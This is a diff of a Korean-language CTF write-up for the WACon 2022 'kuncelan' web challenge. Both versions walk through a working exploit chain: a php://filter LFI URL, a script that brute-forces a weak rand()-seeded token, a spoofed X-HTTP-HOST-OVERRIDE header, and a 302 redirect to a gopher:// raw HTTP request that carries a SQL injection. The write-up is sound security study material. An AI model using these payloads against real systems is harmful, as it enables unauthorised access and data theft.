@@ -1,36 +1,127 @@
 ---
 title: "2022 WACon CTF - kuncelan Writeup"
-description: "LFI, Hash Cracking, SSRF, Gopher Protocol을 이용한 문제 풀이"
-date: 2022-06-26
+description: "WACon 2022 kuncelan(blackbox) 웹 문제 풀이 - LFI, SSRF, Gopher를 이용한 SQL Injection"
+date: 2022-06-18
+tags: ["wacon", "lfi", "ssrf", "gopher", "sqli"]
+ctf: "WACon CTF 2022"
 published: true
-ctf: "WACon 2022"
-category: "web"
-difficulty: "medium"
-tags: ["lfi", "ssrf", "gopher", "hash-cracking"]
 ---
 
-## kuncelan
+# 2022 WACon CTF - kuncelan (blackbox) Writeup
 
-> http://114.203.209.112:8000/index.phtml?fun_004ded7246=php://filter/convert.base64-encode/resource=/var/www/html/load
+## 문제 분석
 
-### 1. LFI 취약점 발견
+### LFI 발견
 
-첫 번째로 LFI 취약점이 존재했습니다. `php://filter`를 통해 소스코드를 추출할 수 있었습니다.
+```
+http://114.203.209.112:8000/index.phtml?fun_004ded7246=php://filter/convert.base64-encode/resource=/var/www/html/load
+```
+
+LFI가 존재한다.
+
+### load.phtml 추출 결과
 
 ```php
-// load.phtml 추출 결과
-function gen($user){
-    return substr(sha1((string)rand(0,getrandmax())),0,20);
+<?php
+// LOCATION : ./internal_e0134cd5a917.php
+error_reporting(0);
+session_start();
+
+if (!isset($_SESSION['username'])) {
+    header('location: ./login.php');
+    die();
 }
 
-if(!isset($_SESSION['X-SECRET'])){
+if (__FILE__ === $_SERVER['SCRIPT_FILENAME']) {
+    die("only in include");
+}
+
+function valid_url($url) {
+    $valid = False;
+    $res = preg_match('/^(http|https)?:\/\/.*(\/)?.* $/', $url);
+    if (!$res) $valid = True;
+    try {
+        parse_url($url);
+    } catch(Exception $e) {
+        $valid = True;
+    }
+    $int_ip = ip2long(gethostbyname(parse_url($url)['host']));
+    return $valid || 
+        ip2long('127.0.0.0') >> 24 == $int_ip >> 24 ||
+        ip2long('10.0.0.0') >> 24 == $int_ip >> 24 ||
+        ip2long('172.16.0.0') >> 20 == $int_ip >> 20 ||
+        ip2long('192.168.0.0') >> 16 == $int_ip >> 16 ||
+        ip2long('0.0.0.0') >> 24 == $int_ip >> 24;
+}
+
+function get_data($url) {
+    if (valid_url($url) === True) {
+        return "IP not allowed or host error";
+    }
+    $ch = curl_init();
+    $timeout = 7;
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    $data = curl_exec($ch);
+    if (curl_error($ch)) {
+        curl_close($ch);
+        return "Error !";
+    }
+    curl_close($ch);
+    return $data;
+}
+
+function gen($user) {
+    return substr(sha1((string)rand(0,getrandmax())), 0, 20);
+}
+
+if (!isset($_SESSION['X-SECRET'])) {
     $_SESSION["X-SECRET"] = gen();
+}
+if (!isset($_COOKIE['USER'])) {
+    setcookie("USER", $_SESSION['username']);
+}
+if (!isset($_COOKIE['X-TOKEN'])) {
+    setcookie("X-TOKEN", hash("sha256", $_SESSION['X-SECRET']."guest"));
+}
+
+$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? 
+       $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);
+
+$out = "";
+if (isset($_POST['url']) && !empty($_POST['url'])) {
+    if ($IP === "127.0.0.1" & 
+        $_COOKIE['X-TOKEN'] === hash("sha256", $_SESSION['X-SECRET'].$_COOKIE['USER']) & 
+        strpos($_COOKIE['USER'], 'admin') !== false) {
+        $out = get_data($_POST['url']);
+    } else {
+        $out = "Only the administrator can test this function from 127.0.0.1!";
+    }
+}
+?>
+```
+
+curl 기능을 admin만 localhost에서 쓸 수 있다고 해놨는데, 이는 우회가 가능하다.
+
+---
+
+## 취약점 분석
+
+### 1. Token Hash Cracking
+
+```php
+function gen($user) {
+    return substr(sha1((string)rand(0,getrandmax())), 0, 20);
 }
 ```
 
-### 2. Hash Cracking
+`getrandmax()`로 랜덤값을 뽑아 sha1으로 해싱하고 10바이트만 뽑아서 이를 다시 username과 붙여 sha256 해싱을 한다.
 
-`getrandmax()`는 약 21억 정도밖에 안 되기 때문에 개인 PC로도 짧은 시간 안에 크랙할 수 있습니다.
+하지만 **getrandmax는 21억가량밖에 안되기 때문에**, 개인 PC로도 적은 시간 안에 해시를 크랙해낼 수 있다.
 
 ```python
 from arang import *
@@ -47,27 +138,25 @@ for i in range(40000000, 500000000):
         print(f"[+] {i} : {xsecret} {t}")
 ```
 
-X-SECRET 값을 얻으면 admin 용 X-TOKEN을 생성할 수 있습니다.
+대충 이런식으로 해시를 크랙해보면 내 세션에 대한 xsecret값이 나타난다.
+이제 이 xsecret으로 valid한 admin x-token을 만들어내면 token auth를 우회할 수 있다.
 
-### 3. IP 검증 우회
+### 2. IP Check Bypass
 
 ```php
-$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) 
-    ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] 
-    : $_SERVER['REMOTE_ADDR']);
-
-if ( $IP === "127.0.0.1" ){
-    // curl 기능 사용 가능
-}
+$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? 
+       $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);
+// ...
+if ($IP === "127.0.0.1") {
 ```
 
-`X-HTTP-HOST-OVERRIDE` 헤더를 추가하여 `127.0.0.1`로 설정하면 우회됩니다.
+이건 `X-HTTP-HOST-OVERRIDE`라는 헤더를 추가해서 127.0.0.1으로 맞춰줌으로써 우회가 가능하다.
 
-### 4. SSRF via 302 Redirect
+### 3. SSRF via 302 Redirect
 
-cURL 옵션에 `CURLOPT_FOLLOWLOCATION`이 설정되어 있어서 302 Redirect를 따라갑니다.
+curl 옵션에 `CURLOPT_FOLLOWLOCATION`이 존재한다.
 
-내 서버에서 Gopher 프로토콜로 리다이렉트:
+302 Redirection을 curl이 처리하기 때문에 내 서버로 보낸 다음 302 redirection 때리면 될 것 같다.
 
 ```php
 <?php
@@ -75,25 +164,34 @@ header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTT
 ?>
 ```
 
-### 5. SQLi를 통한 플래그 획득
+---
 
-Basic Authorization을 SQL 쿼리에 넣는 것을 발견하고 SQLi를 수행:
+## Exploit
 
+### Step 1: Internal Endpoint 접근
+
+`load.phtml`에 주석으로 써있던 `internal_e0134cd5a917.php` 파일을 location으로 돌리면 next file location 발견!
+
+### Step 2: SQL Injection
+
+Basic Authorization이 없다고 한다.
+`guest:guest`로 보내보니 `SQL : user not found`라고 한다.
+
+아마도 Basic Authorization을 SQL query 안에 넣는 것 같다.
+SQLi 구문을 넣어보면 localhost only라고 한다.
+
+**Gopher를 사용해서 localhost에서 SQLi 수행!**
+
+```php
+header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aAuthorization:%20Basic%20YWRtaW4nfHwxIzpndWVzdA==%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%203%0d%0a%0d%0aa=a%0d%0a%0d%0a");
 ```
-Authorization: Basic YWRtaW4nfHwxIzpndWVzdA==
-// admin'||1#:guest
-```
 
-Gopher로 HTTP raw packet을 만들어 전송하면 플래그 획득!
+gopher로 HTTP raw packet을 만들어 보내면 나머지 패킷 획득!
+
+---
 
 ## Flag
 
 ```
 WACon{Try_using_Gophhhher_ffabcdbc}
 ```
-
-## 배운 점
-
-- `getrandmax()`의 범위가 작아 해시 크래킹이 가능함
-- `X-HTTP-HOST-OVERRIDE` 같은 비표준 헤더로 IP 검증 우회 가능
-- `CURLOPT_FOLLOWLOCATION` + 302 Redirect + Gopher로 SSRF 수행 가능
